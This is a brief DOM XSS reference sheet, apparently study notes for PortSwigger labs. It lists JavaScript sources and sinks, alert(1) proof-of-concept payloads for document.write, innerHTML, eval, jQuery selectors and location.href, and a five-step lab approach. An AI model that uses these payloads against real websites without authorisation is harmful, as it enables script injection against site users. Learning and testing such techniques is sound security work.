# DOM XSS - Attack Techniques

## Common Sources
```
document.location
document.URL
document.referrer
location.search
location.hash
location.href
window.name
postMessage data
```

## Common Sinks
```
document.write()
document.writeln()
innerHTML
outerHTML
insertAdjacentHTML()
eval()
setTimeout()
setInterval()
Function()
location.href
location.assign()
location.replace()
```

## Payloads

### document.write + location.search
```
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

### jQuery $() selector + hashchange
```
#<img src=x onerror=alert(1)>
# Delivery: iframe.src = sameURL + '#hash'
```

### innerHTML
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### eval()
```
alert(1)
```

### location.href
```
javascript:alert(1)
```

## PortSwigger Lab Approach
1. Identify source (location.search, location.hash, etc.)
2. Identify sink (document.write, innerHTML, eval, etc.)
3. Craft payload that reaches sink from source
4. Test in browser console first
5. Deliver via exploit server if needed
